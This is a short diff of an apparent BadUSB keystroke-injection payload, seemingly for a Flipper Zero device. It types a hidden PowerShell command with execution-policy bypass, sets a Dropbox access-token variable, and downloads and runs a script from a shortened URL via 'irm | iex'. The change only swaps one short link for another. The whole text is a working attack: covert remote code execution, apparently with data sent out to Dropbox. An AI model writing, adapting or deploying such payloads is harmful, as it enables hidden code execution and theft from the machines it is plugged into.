@@ -7,5 +7,5 @@ DELAY 750
 STRING powershell -NoP -NonI -W Hidden -Exec Bypass
 ENTER
 DELAY 4000
-STRING $db='YOUR_DROPBOX_ACCESS_TOKEN';irm https://n9.cl/mrflipper10 | iex
+STRING $db='YOUR_DROPBOX_ACCESS_TOKEN';irm https://n9.cl/mrflippermen10 | iex
 ENTER
